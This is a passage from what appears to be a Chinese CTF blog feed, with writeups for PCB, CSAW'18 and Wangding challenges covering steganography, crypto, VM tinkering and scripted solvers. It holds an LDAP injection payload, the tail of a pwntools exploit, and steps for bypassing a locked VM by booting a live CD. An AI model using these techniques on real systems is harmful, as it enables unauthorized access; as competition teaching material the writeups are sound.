class="hljs-string">"\x90"</span>)p.recvuntil(<span class="hljs-string">"start!!!!"</span>)p.send(test)<span class="hljs-string">""</span><span class="hljs-string">"p.interactive()</span></code></pre></p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x02-traffic-light"><a href="#0x02-traffic-light" class="headerlink" title="0x02 traffic light"></a>0x02 traffic light</h4><p>题目给的GIF图片有1168帧，把每一帧都提取出来，红绿灯表示01，黄灯表示间隔，得到二进制再转城可见字符就可以得到flag</p><h4 id="0x03-GreatWall"><a href="#0x03-GreatWall" class="headerlink" title="0x03 GreatWall"></a>0x03 GreatWall</h4><p>lsb隐写提出一张jpg，+是分隔符，长短杠分别是二进制的1和0，然后转成字符<br><pre><code class="hljs undefined">#encoding:utf-<span class="hljs-number">8</span>list1 = [<span class="hljs-number">1010011</span>,<span class="hljs-number">1110100,110011</span>,<span class="hljs-number">1100111,110100</span>,<span class="hljs-number">1101110,110000</span>,<span class="hljs-number">1100111</span>,<span class="hljs-number">1110010</span>,<span class="hljs-number">110100</span>,<span class="hljs-number">1110000</span>,<span class="hljs-number">1101000</span>,<span class="hljs-number">1111001</span>,<span class="hljs-number">1011111,110001</span>,<span class="hljs-number">1110011</span>,<span class="hljs-number">1011111,110001</span>,<span class="hljs-number">1101110,1110100</span>,<span class="hljs-number">110011</span>,<span class="hljs-number">1110010</span>,<span class="hljs-number">110011</span>,<span class="hljs-number">1110011</span>,<span class="hljs-number">1110100,110001</span>,<span class="hljs-number">1101110,1100111</span>]j = ''result =''for i in range(len(list1)):    tmp = int(str(list1[i]),<span class="hljs-number">2</span>)    result += chr(tmp)    print result</code></pre></p><h4 id="0x04-hack1t"><a href="#0x04-hack1t" class="headerlink" title="0x04 hack1t"></a>0x04 hack1t</h4><p>这道题的思路类似于进pe系统读windows的文件，通过加载另外一个系统读取文件。首先这个虚拟机有密码，题目已经给出了，但是没有给出修改配置的密码，也就是说我们只能打开，不能修改任何东西，配置文件xxx.vmx也是被加了密的，百度到一个github项目可以破解vmx配置文件的破解<br><a href="https://github.com/RF3/VMwareVMX" target="_blank" rel="noopener">GitHub项目</a><br>但是这个项目的代码有一点瑕疵，直接解密会触发一个错误<br><img src="/img/2018-12-03/1.png" srcset="/img/static/loading.gif" alt="1"><br><pre><code class="hljs undefined">root<span class="hljs-variable">@Ubuntu</span><span class="hljs-symbol">:~/Desktop/VMwareVMX-master</span><span class="hljs-comment"># python3 main.py "Ubuntu 64-bit.vmx" </span><span class="hljs-symbol">Password:</span><span class="hljs-symbol">Error:</span> File Ubuntu <span class="hljs-number">64</span>-bit.vmx is <span class="hljs-keyword">not</span> a valid VMX file</code></pre></p><p>原因是代码中给的<code>displayname</code>是小写，但是判断却是大写<code>displayName</code>,修改成小写即可<br><img src="/img/2018-12-03/2.png" srcset="/img/static/loading.gif" alt="2"><br>然后就可以得到解密后的vmx配置信息<br><pre><code class="hljs undefined">root@Ubuntu:~/Desktop/VMwareVMX-master<span class="hljs-comment"># python3 main.py "Ubuntu 64-bit.vmx" </span>Password:<span class="hljs-attr">guestos</span> = <span class="hljs-string">"ubuntu-64"</span>virtualhw.<span class="hljs-attr">version</span> = <span class="hljs-string">"13"</span>config.<span class="hljs-attr">version</span> = <span class="hljs-string">"8"</span><span class="hljs-attr">numvcpus</span> = <span class="hljs-string">"2"</span>cpuid.<span class="hljs-attr">coresPerSocket</span> = <span class="hljs-string">"1"</span><span class="hljs-attr">memsize</span> = <span class="hljs-string">"2048"</span>pciBridge0.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>pciBridge4.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>pciBridge4.<span class="hljs-attr">virtualDev</span> = <span class="hljs-string">"pcieRootPort"</span>pciBridge4.<span class="hljs-attr">functions</span> = <span class="hljs-string">"8"</span>pciBridge5.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>pciBridge5.<span class="hljs-attr">virtualDev</span> = <span class="hljs-string">"pcieRootPort"</span>pciBridge5.<span class="hljs-attr">functions</span> = <span class="hljs-string">"8"</span>pciBridge6.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>pciBridge6.<span class="hljs-attr">virtualDev</span> = <span class="hljs-string">"pcieRootPort"</span>pciBridge6.<span class="hljs-attr">functions</span> = <span class="hljs-string">"8"</span>pciBridge7.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>pciBridge7.<span class="hljs-attr">virtualDev</span> = <span class="hljs-string">"pcieRootPort"</span>pciBridge7.<span class="hljs-attr">functions</span> = <span class="hljs-string">"8"</span>vmci0.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>mks.<span class="hljs-attr">enable3d</span> = <span class="hljs-string">"true"</span>scsi0:<span class="hljs-number">0</span>.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>scsi0:<span class="hljs-number">0</span>.<span class="hljs-attr">deviceType</span> = <span class="hljs-string">"disk"</span>scsi0:<span class="hljs-number">0</span>.<span class="hljs-attr">fileName</span> = <span class="hljs-string">"Ubuntu 64-bit-disk1.vmdk"</span>scsi0:<span class="hljs-number">0</span>.<span class="hljs-attr">mode</span> = <span class="hljs-string">"persistent"</span>scsi0.<span class="hljs-attr">virtualDev</span> = <span class="hljs-string">"lsilogic"</span>scsi0.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>sata0.<span class="hljs-attr">present</span> = <span class="hljs-string">"TRUE"</span>vmci0.<span class="hljs-attr">unrestricted</span> = <span class="hljs-string">"false"</span>vcpu.<span class="hljs-attr">hotadd</span> = <span class="hljs-string">"true"</span>mem.<span class="hljs-attr">hotadd</span> = <span class="hljs-string">"true"</span>powerType.<span class="hljs-attr">powerOff</span> = <span class="hljs-string">"soft"</span>powerType.<span class="hljs-attr">reset</span> = <span class="hljs-string">"soft"</span>powerType.<span class="hljs-attr">suspend</span> = <span class="hljs-string">"soft"</span>toolscripts.<span class="hljs-attr">afterpoweron</span> = <span class="hljs-string">"true"</span>toolscripts.<span class="hljs-attr">afterresume</span> = <span class="hljs-string">"true"</span>toolscripts.<span class="hljs-attr">beforepoweroff</span> = <span class="hljs-string">"true"</span>toolscripts.<span class="hljs-attr">beforesuspend</span> = <span class="hljs-string">"true"</span>tools.<span class="hljs-attr">syncTime</span> = <span class="hljs-string">"false"</span><span class="hljs-attr">nvram</span> = <span class="hljs-string">"Ubuntu 64-bit-file1.nvram"</span>virtualHW.<span class="hljs-attr">productCompatibility</span> = <span class="hljs-string">"hosted"</span><span class="hljs-attr">extendedConfigFile</span> = <span class="hljs-string">"Ubuntu 64-bit.vmxf"</span><span class="hljs-attr">dataFileKey</span> = <span class="hljs-string">"type=key:cipher=AES-256:key=NHhuUIeIg1lhhNi7CvHXZysR+lrMxsNhJl7DO0SIuZ4%3d"</span><span class="hljs-attr">cryptoState</span> = <span class="hljs-string">"encrypted"</span>isolation.tools.copy.<span class="hljs-attr">disable</span> = <span class="hljs-string">"TRUE"</span>isolation.tools.dnd.<span class="hljs-attr">disable</span> = <span class="hljs-string">"TRUE"</span>isolation.tools.paste.<span class="hljs-attr">disable</span> = <span class="hljs-string">"TRUE"</span>policy.vm.<span class="hljs-attr">mvmtid</span> = <span class="hljs-string">"52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29"</span>rollingTier0.<span class="hljs-attr">uid</span> = <span class="hljs-string">"1"</span>rollingTier0.<span class="hljs-attr">interval</span> = <span class="hljs-string">"86400"</span>rollingTier0.<span class="hljs-attr">maximum</span> = <span class="hljs-string">"1"</span>rollingTier0.<span class="hljs-attr">clientFlags</span> = <span class="hljs-string">"8"</span>rollingTier0.<span class="hljs-attr">displayName</span> = <span class="hljs-string">"自动保护快照"</span>rollingTier1.<span class="hljs-attr">uid</span> = <span class="hljs-string">"2"</span>rollingTier1.<span class="hljs-attr">interval</span> = <span class="hljs-string">"604800"</span>rollingTier1.<span class="hljs-attr">baseTier</span> = <span class="hljs-string">"1"</span>rollingTier1.<span class="hljs-attr">baseTierInterval</span> = <span class="hljs-string">"7"</span>rollingTier1.<span class="hljs-attr">maximum</span> = <span class="hljs-string">"1"</span>rollingTier1.<span class="hljs-attr">clientFlags</span> = <span class="hljs-string">"8"</span>rollingTier1.<span class="hljs-attr">displayName</span> = <span class="hljs-string">"自动保护快照"</span>rollingTier2.<span class="hljs-attr">uid</span> = <span class="hljs-string">"3"</span>rollingTier2.<span class="hljs-attr">interval</span> = <span class="hljs-string">"2419200"</span>rollingTier2.<span class="hljs-attr">baseTier</span> = <span class="hljs-string">"1"</span>rollingTier2.<span class="hljs-attr">baseTierInterval</span> = <span class="hljs-string">"28"</span>rollingTier2.<span class="hljs-attr">maximum</span> = <span class="hljs-string">"1"</span>rollingTier2.<span class="hljs-attr">clientFlags</span> = <span class="hljs-string">"8"</span>rollingTier2.<span class="hljs-attr">displayName</span> = <span class="hljs-string">"自动保护快照"</span>snapshot.<span class="hljs-attr">numRollingTiers</span> = <span class="hljs-string">"3"</span>floppy0.<span class="hljs-attr">present</span> = <span class="hljs-string">"FALSE"</span>uuid.<span class="hljs-attr">bios</span> = <span class="hljs-string">"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb"</span>uuid.<span class="hljs-attr">location</span> = <span class="hljs-string">"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb"</span>migrate.<span class="hljs-attr">hostlog</span> = <span class="hljs-string">".\Ubuntu 64-bit-0dae80fb.hlog"</span>scsi0:<span class="hljs-number">0</span>.<span class="hljs-attr">redo</span> = <span class="hljs-string">""</span>pciBridge0.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"17"</span>pciBridge4.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"21"</span>pciBridge5.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"22"</span>pciBridge6.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"23"</span>pciBridge7.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"24"</span>scsi0.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"16"</span>vmci0.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"32"</span>sata0.<span class="hljs-attr">pciSlotNumber</span> = <span class="hljs-string">"33"</span>vmci0.<span class="hljs-attr">id</span> = <span class="hljs-string">"-119750326"</span>monitor.<span class="hljs-attr">phys_bits_used</span> = <span class="hljs-string">"43"</span>vmotion.<span class="hljs-attr">checkpointFBSize</span> = <span class="hljs-string">"4194304"</span>vmotion.<span class="hljs-attr">checkpointSVGAPrimarySize</span> = <span class="hljs-string">"134217728"</span><span class="hljs-attr">cleanShutdown</span> = <span class="hljs-string">"TRUE"</span><span class="hljs-attr">softPowerOff</span> = <span class="hljs-string">"FALSE"</span>svga.<span class="hljs-attr">guestBackedPrimaryAware</span> = <span class="hljs-string">"TRUE"</span>rollingTier0.<span class="hljs-attr">timeSincelast</span> = <span class="hljs-string">"203"</span>rollingTier1.<span class="hljs-attr">timeSincelast</span> = <span class="hljs-string">"203"</span>rollingTier2.<span class="hljs-attr">timeSincelast</span> = <span class="hljs-string">"203"</span>svga.<span class="hljs-attr">vramSize</span> = <span class="hljs-string">"134217728"</span></code></pre></p><p>用一个正常的虚拟机添加一个CD/DVD，指向一个kali的iso，发现配置文件会多了下面三行代码<br><pre><code class="hljs undefined">sata0:<span class="hljs-number">0</span><span class="hljs-selector-class">.deviceType</span> = <span class="hljs-string">"cdrom-image"</span>sata0:<span class="hljs-number">0</span><span class="hljs-selector-class">.fileName</span> = <span class="hljs-string">"D:\kali\kali-linux-2018.2-amd64.iso"</span>sata0:<span class="hljs-number">0</span><span class="hljs-selector-class">.present</span> = <span class="hljs-string">"TRUE"</span></code></pre></p><p>加到上面的代码上去重新加密一下<br><pre><code class="hljs undefined">root<span class="hljs-variable">@Ubuntu</span><span class="hljs-symbol">:~/Desktop/VMwareVMX-master</span><span class="hljs-comment"># python3 main.py -e -D "Ubuntu 64-bit" -p bibinb ubuntu.vmx result.vmx</span></code></pre></p><p><code>-D</code>指定虚拟机的名字，<code>ubuntu.vmx</code>待加密的文件，<code>result.vmx</code>加密后的结果，再用result.vmx替换掉原来的配置，打开虚拟机就可以看到多了CD/DVD<br><img src="/img/2018-12-03/3.png" srcset="/img/static/loading.gif" alt="3"><br>开机按esc进BIOS选CD/DVD启动<br><img src="/img/2018-12-03/4.png" srcset="/img/static/loading.gif" alt="4"><br>选第一个<br><img src="/img/2018-12-03/5.png" srcset="/img/static/loading.gif" alt="5"><br>进到kali里打开文件系统<br><img src="/img/2018-12-03/6.jpg" srcset="/img/static/loading.gif" alt="6"><br>find一下<br><img src="/img/2018-12-03/7.png" srcset="/img/static/loading.gif" alt="7"><br>把4个部分凑一起打开就getflag<br><img src="/img/2018-12-03/8.png" srcset="/img/static/loading.gif" alt="8"></p><h4 id="0x05-What’s-this"><a href="#0x05-What’s-this" class="headerlink" title="0x05 What’s_this"></a>0x05 What’s_this</h4><p><a href="https://delcoding.github.io/2018/12/pcb-writeup/" target="_blank" rel="noopener">文件删了复现不了了，只能看大佬的博客了</a></p><h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="0x04-easy-crypto"><a href="#0x04-easy-crypto" class="headerlink" title="0x04 easy crypto"></a>0x04 easy crypto</h4><p>本质就是异或，逆操作一遍就可以了<br>payloa如下：<br><pre><code class="hljs undefined"><span class="hljs-comment">#!usr/bin/python </span><span class="hljs-comment">#_*_ coding=UTF-8 _*_</span>from Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_hexfrom Crypto import Randomimport sys<span class="hljs-comment">#from FLAG import flag</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aesdemo</span>:</span><span class="hljs-comment">#aes = AES.new(key,mode)</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,key)</span></span>:<span class="hljs-keyword">self</span>.key = key<span class="hljs-comment">#self.BS=BS</span>       <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pad</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,msg)</span></span>:<span class="hljs-comment">#BS = AES.block_size </span><span class="hljs-comment"># aes数据分组长度为128 bit</span>byte = <span class="hljs-number">16</span> - len(msg) % <span class="hljs-number">16</span><span class="hljs-keyword">return</span> msg + chr(byte) * byte<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">unpad</span><span class="hljs-params">(msg)</span></span>:<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-symbol">msg:</span><span class="hljs-keyword">return</span> <span class="hljs-string">''</span><span class="hljs-keyword">return</span> msg[<span class="hljs-symbol">:-ord</span>(msg[-<span class="hljs-number">1</span>])]    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,a, b)</span></span>:    <span class="hljs-comment">#assert len(a) == len(b)</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([chr(ord(ai)^ord(bi)) <span class="hljs-keyword">for</span> ai, bi <span class="hljs-keyword">in</span> zip(a,b)])<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">split_by</span><span class="hljs-params">(<span class="hljs-keyword">self</span>,data,step)</span></span>:        <span class="hljs-keyword">return</span> [data[i : i+step] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, len(data), step)]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">encrypt</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, plaintext)</span></span>:        <span class="hljs-comment"># 生成随机初始向量IV</span>iv = Random.new().read(<span class="hljs-number">16</span>)print <span class="hljs-string">"iv is"</span>,iv.encode(<span class="hljs-string">'hex'</span>)aes = AES.new(<span class="hljs-keyword">self</span>.key,AES.MODE_CBC,iv)prev_pt = ivprev_ct = ivct=<span class="hljs-string">""</span>msg=<span class="hljs-keyword">self</span>.pad(plaintext)<span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.split_by(msg, <span class="hljs-number">16</span>):ct_block = <span class="hljs-keyword">self</span>.xor(block, prev_pt)ct_block = aes.encrypt(ct_block)ct_block = <span class="hljs-keyword">self</span>.xor(ct_block, prev_ct)ct += ct_block<span class="hljs-keyword">return</span> b2a_hex(iv + ct)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-keyword">self</span>, ciphertext,iv)</span></span>:        <span class="hljs-comment"># 生成随机初始向量IV</span>print <span class="hljs-string">"iv is"</span>,iv.encode(<span class="hljs-string">'hex'</span>)aes = AES.new(<span class="hljs-keyword">self</span>.key,AES.MODE_CBC,iv)prev_pt = ivprev_ct = ivct=<span class="hljs-string">""</span><span class="hljs-comment">#msg=self.pad(plaintext)</span><span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> <span class="hljs-keyword">self</span>.split_by(ciphertext, <span class="hljs-number">16</span>):ct_block = <span class="hljs-keyword">self</span>.xor(block, prev_pt)ct_block = aes.decrypt(ct_block)ct_block = <span class="hljs-keyword">self</span>.xor(ct_block, prev_ct)ct += ct_block<span class="hljs-keyword">return</span> b2a_hex(iv + ct)s = <span class="hljs-string">'524160f3d098ad937e252494f827f8cf26cc549e432ff4b11ccbe2d8bfa76e5c6606aad5ba17488f11189d41bca45baa'</span> iv = s[<span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">32</span>].decode(<span class="hljs-string">'hex'</span>)sc = s[<span class="hljs-number">32</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:</span>].decode(<span class="hljs-string">'hex'</span>)print len(iv),len(sc)flag = <span class="hljs-string">'A'</span>*<span class="hljs-number">64</span>BS = AES.block_size <span class="hljs-comment"># aes数据分组长度为128 bit</span>key=<span class="hljs-string">"asdfghjkl1234567890qwertyuiopzxc"</span>demo = aesdemo(key)e = demo.encrypt(flag)print(<span class="hljs-string">"加密："</span>, e)aaa = demo.decrypt(sc,iv)print aaaprint aaa.decode(<span class="hljs-string">'hex'</span>)</code></pre></p>]]></content>
    
    
    
    <tags>
      
      <tag>writeup</tag>
      
      <tag>misc</tag>
      
      <tag>pwn</tag>
      
      <tag>PCB鹏城杯</tag>
      
      <tag>crypro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAW&#39;18 CTF writeup</title>
    <link href="/2018/09/17/CSAW/"/>
    <url>/2018/09/17/CSAW/</url>
    
    <content type="html"><![CDATA[<p><del>web题目好难啊</del>，太菜了，真的是太菜了</p><a id="more"></a><h5 id="Ldab"><a href="#Ldab" class="headerlink" title="Ldab"></a>Ldab</h5><p>&emsp;&emsp;瞎测了一下发现不是sql注入，百度查了一下<code>Ldab</code>得到一个<code>Ldap注入</code>，Ldap是轻量级目录访问协议，是一种在线目录访问协议。LDAP主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。简单来说就是类似数据库的一个东东。详细介绍点这里–&gt;<a href="https://www.jianshu.com/p/d94673be9ed0" target="_blank" rel="noopener">传送门</a><br>第一次接触找不到注入姿势，下面给出大佬的payload<br><pre><code class="hljs undefined">*)<span class="hljs-params">(<span class="hljs-attr">uid</span>=*)</span>)<span class="hljs-params">(|(<span class="hljs-attr">uid</span>=*</span></code></pre></p><p><img src="/img/2018-09-17/1.png" srcset="/img/static/loading.gif" alt="1"></p><h4 id="Algebra"><a href="#Algebra" class="headerlink" title="Algebra"></a>Algebra</h4><p>数学计算，下面放出大佬的payload<br><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><span class="hljs-keyword">import</span> socketsc = socket.socket()  <span class="hljs-comment"># 创建 socket 对象</span>host = <span class="hljs-string">"misc.chal.csaw.io"</span>  <span class="hljs-comment"># 获取本地主机名</span>port = <span class="hljs-number">9002</span>  <span class="hljs-comment"># 设置端口</span>addr = (host, port)sc.connect(addr)  <span class="hljs-comment"># 绑定端口号</span><span class="hljs-keyword">print</span> sc.recv(<span class="hljs-number">1024</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve1</span><span class="hljs-params">(eq,var=<span class="hljs-string">'X'</span>)</span>:</span>    eq1 = eq.replace(<span class="hljs-string">"="</span>,<span class="hljs-string">"-("</span>) + <span class="hljs-string">")"</span>    c = eval(eq1,&#123;var:<span class="hljs-number">1j</span>&#125;)    <span class="hljs-keyword">if</span> (-c.real == <span class="hljs-number">0</span>):        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> -c.real/c.imag<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span><span class="hljs-params">()</span>:</span>    data = sc.recv(<span class="hljs-number">1024</span>)    <span class="hljs-keyword">print</span> data    equation = data.split(<span class="hljs-string">'\n'</span>)[<span class="hljs-number">0</span>]    result = str(solve1(equation))    <span class="hljs-keyword">print</span> <span class="hljs-string">'正在求解：'</span> + equation + <span class="hljs-string">', result = '</span> + result    sc.send(result + <span class="hljs-string">'\n'</span>)    <span class="hljs-keyword">print</span> <span class="hljs-string">'==========================='</span>find()i = <span class="hljs-number">1</span><span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:    <span class="hljs-keyword">print</span> <span class="hljs-string">'============ 第 '</span> + str(i + <span class="hljs-number">1</span>) + <span class="hljs-string">' 轮 ==============='</span>    data = sc.recv(<span class="hljs-number">2048</span>)    <span class="hljs-keyword">print</span> data    equation = data.split(<span class="hljs-string">'\n'</span>)[<span class="hljs-number">1</span>]    result = str(solve1(equation))    <span class="hljs-keyword">print</span> <span class="hljs-string">'正在求解：'</span> + equation + <span class="hljs-string">', result = '</span> + result    sc.send(result + <span class="hljs-string">'\n'</span>)    i += <span class="hljs-number">1</span></code></pre></p><h5 id="Take-an-L"><a href="#Take-an-L" class="headerlink" title="Take an L"></a>Take an L</h5><p>题目意思是，给你一个64x64的棋盘，随机给一个特殊格子，像下面<br><img src="/img/2018-09-17/2.png" srcset="/img/static/loading.gif" alt="2"><br>然后用四种L型的瓷砖覆盖<br><img src="/img/2018-09-17/3.gif" srcset="/img/static/loading.gif" alt="3"><br>然后把每个L型瓷砖的坐标发过去<br>百度上找到的一个分治策略的做法–&gt;<a href="https://www.jianshu.com/p/97b09ef06735" target="_blank" rel="noopener">传送门</a><br><img src="/img/2018-09-17/4.png" srcset="/img/static/loading.gif" alt="4"><br><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> re<span class="hljs-comment">#context.log_level ="debug"</span>nc = remote(<span class="hljs-string">"misc.chal.csaw.io"</span>,<span class="hljs-number">9000</span>)nc.recvlines(<span class="hljs-number">4</span>)dimension = nc.recvline()<span class="hljs-keyword">print</span> dimensiontxt = nc.recvline()<span class="hljs-keyword">print</span> txtlocaltion2 = re.search(<span class="hljs-string">':'</span>,txt).span()block = txt[localtion2[<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>:<span class="hljs-number">-1</span>]li = re.findall(<span class="hljs-string">r'\d+'</span>,block)xxxx = int(li[<span class="hljs-number">0</span>])yyyy = int(li[<span class="hljs-number">1</span>])<span class="hljs-comment"># 定义数组宽度为2的几次方</span>k = <span class="hljs-number">6</span><span class="hljs-comment"># 棋盘宽度</span>size1 = pow(<span class="hljs-number">2</span>, k)<span class="hljs-comment"># L形块的初始值</span>mark = <span class="hljs-number">0</span><span class="hljs-comment"># table初始化</span>table = [[<span class="hljs-number">-1</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(size1)] <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> range(size1)] flag = <span class="hljs-string">""</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">chess</span><span class="hljs-params">(tr, tc, pr, pc, size)</span>:</span>    <span class="hljs-keyword">global</span> mark    <span class="hljs-keyword">global</span> table    <span class="hljs-keyword">if</span> size == <span class="hljs-number">1</span>:        <span class="hljs-keyword">return</span>    mark += <span class="hljs-number">1</span>    count = mark    half = size // <span class="hljs-number">2</span>    <span class="hljs-keyword">if</span> pr &lt; tr + half <span class="hljs-keyword">and</span> pc &lt; tc + half:        chess(tr, tc, pr, pc, half)    <span class="hljs-keyword">else</span>:        table[tr + half - <span class="hljs-number">1</span>][tc + half - <span class="hljs-number">1</span>] = count        chess(tr, tc, tr + half - <span class="hljs-number">1</span>, tc + half - <span class="hljs-number">1</span>, half)    <span class="hljs-keyword">if</span> pr &lt; tr + half <span class="hljs-keyword">and</span> pc &gt;= tc + half:        chess(tr, tc + half, pr, pc, half)    <span class="hljs-keyword">else</span>:        table[tr + half - <span class="hljs-number">1</span>][tc + half] = count        chess(tr, tc + half, tr + half - <span class="hljs-number">1</span>, tc + half, half)    <span class="hljs-keyword">if</span> pr &gt;= tr + half <span class="hljs-keyword">and</span> pc &lt; tc + half:        chess(tr + half, tc, pr, pc, half)    <span class="hljs-keyword">else</span>:        table[tr + half][tc + half - <span class="hljs-number">1</span>] = count        chess(tr + half, tc, tr + half, tc + half - <span class="hljs-number">1</span>, half)    <span class="hljs-keyword">if</span> pr &gt;= tr + half <span class="hljs-keyword">and</span> pc &gt;= tc + half:        chess(tr + half, tc + half, pr, pc, half)    <span class="hljs-keyword">else</span>:        table[tr + half][tc + half] = count        chess(tr + half, tc + half, tr + half, tc + half, half)  <span class="hljs-comment"># 棋盘展示</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(t)</span>:</span>    n = len(t)    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(n):        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(n):            <span class="hljs-keyword">print</span> <span class="hljs-string">"%4d"</span> % t[i][j],        <span class="hljs-keyword">print</span> <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showpoint</span><span class="hljs-params">(t)</span>:</span>    <span class="hljs-keyword">global</span> flag    n = len(t)    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> range(<span class="hljs-number">1366</span>):        <span class="hljs-comment">#5个L</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(n):            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(n):                <span class="hljs-keyword">if</span> (t[i][j] == k):                    x = <span class="hljs-string">"(%d,%d)"</span> % (i,j)                    flag += x                    <span class="hljs-comment">#print "%3s" % x,</span>        flag = re.sub(<span class="hljs-string">'\\)\\('</span>,<span class="hljs-string">'),('</span>,flag)                <span class="hljs-keyword">if</span> (flag != <span class="hljs-string">''</span>):            nc.sendline(flag)            <span class="hljs-keyword">print</span> <span class="hljs-string">"%s ---  ok"</span> % flag        flag = <span class="hljs-string">''</span>                    chess(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, xxxx, yyyy, size1)<span class="hljs-comment">#show(table)</span>showpoint(table)<span class="hljs-keyword">print</span> <span class="hljs-string">"-----------------------ok-------------------------"</span>txt = nc.recvline()<span class="hljs-keyword">print</span> txtnc.interactive()</code></pre></p><p>####战队其他大佬的write<br><strong><a href="https://zoepla.github.io/2018/09/csaw2018_pwn_wp/" target="_blank" rel="noopener">CSAW 2018 pwn wp</a></strong><br><strong><a href="https://delcoding.github.io/2018/09/csaw-writeup/" target="_blank" rel="noopener">CSAW 2018 writeup</a></strong><br><strong><a href="https://delcoding.github.io/2018/09/csaw-writeup2/" target="_blank" rel="noopener">CSAW 2018 复现writeup</a></strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>writeup</tag>
      
      <tag>misc</tag>
      
      <tag>web</tag>
      
      <tag>CSAW&#39;18 CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网鼎杯writeup（复现）</title>
    <link href="/2018/08/21/wangdingbei/"/>
    <url>/2018/08/21/wangdingbei/</url>
    
    <content type="html"><![CDATA[<p><del>不会ps的不是好ctfer</del><br><a id="more"></a></p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="0x00-clip"><a href="#0x00-clip" class="headerlink" title="0x00 clip"></a>0x00 clip</h4><p>题目是一个旧文件系统里恢复来的disk文件<br><img src="/img/2018-08-21/3.png" srcset="/img/static/loading.gif" alt="3"><br>本以为要用到专门的工具去打开找谷歌百度找了一遍啥也没发现，垃圾软件倒是装了不少，后来队友用010搜索IDAT发现一张有头的和没头的图片<br><img src="/img/2018-08-21/7.png" srcset="/img/static/loading.gif" alt="7"><br><img src="/img/2018-08-21/8.png" srcset="/img/static/loading.gif" alt="8"><br>提取出来是这么个鬼样子的<br><img src="/img/2018-08-21/4.png" srcset="/img/static/loading.gif" alt="4"><br><img src="/img/2018-08-21/5.png" srcset="/img/static/loading.gif" alt="5"><br>打横切开<br><img src="/img/2018-08-21/9.png" srcset="/img/static/loading.gif" alt="9"><br>重新拼接成下图（我队友做的）<br><img src="/img/2018-08-21/10.png" srcset="/img/static/loading.gif" alt="10"><br>感受到被<strong>ps和脑洞</strong>支配的恐惧了吗<br><img src="/img/2018-08-21/12.jpg" srcset="/img/static/loading.gif" alt="12"></p><h4 id="0x01-minified"><a href="#0x01-minified" class="headerlink" title="0x01 minified"></a>0x01 minified</h4><p>题目是一张图片<br><img src="/img/2018-08-21/flag_enc.png" 